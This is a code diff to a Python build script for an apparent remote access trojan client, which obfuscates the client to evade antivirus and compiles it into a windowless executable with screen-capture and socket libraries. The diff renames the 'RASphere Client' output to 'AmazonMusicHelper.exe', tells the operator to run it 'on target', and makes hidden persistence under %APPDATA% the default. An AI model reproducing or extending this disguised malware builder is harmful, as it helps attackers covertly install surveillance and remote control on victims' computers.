@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 """
-RASphere Client Builder
-=======================
+Amazon Music Helper - Client Builder
+=====================================
 1. Obfuscates client.py (anti-AV)
 2. Compiles to standalone .exe
 
@@ -49,7 +49,7 @@ def main():
     cmd = [
         sys.executable, "-m", "PyInstaller",
         "--onefile", "--noconsole",
-        "--name", "RASphereClient",
+        "--name", "AmazonMusicHelper",
         "--hidden-import", "socketio",
         "--hidden-import", "engineio",
         "--hidden-import", "mss",
@@ -65,12 +65,14 @@ def main():
 
     r = subprocess.run(cmd)
     if r.returncode == 0:
-        print(f"\n[+] SUCCESS: dist/RASphereClient.exe")
-        print(f"\n    Run on target: RASphereClient.exe")
+        print(f"\n[+] SUCCESS: dist/AmazonMusicHelper.exe")
+        print(f"\n    Run on target: AmazonMusicHelper.exe")
         print(f"    (uses built-in _SERVER and _SECRET from client.py)")
+        print(f"    (auto-installs persistence to %APPDATA%/.amazonmusic/)")
         print(f"\n    Or with args:")
-        print(f"    RASphereClient.exe --install  (adds persistence)")
-        print(f"    RASphereClient.exe --server URL --secret KEY")
+        print(f"    AmazonMusicHelper.exe --no-persist (skip persistence)")
+        print(f"    AmazonMusicHelper.exe --uninstall  (remove persistence)")
+        print(f"    AmazonMusicHelper.exe --server URL --secret KEY")
     else:
         print(f"\n[!] Build failed")
         sys.exit(1)
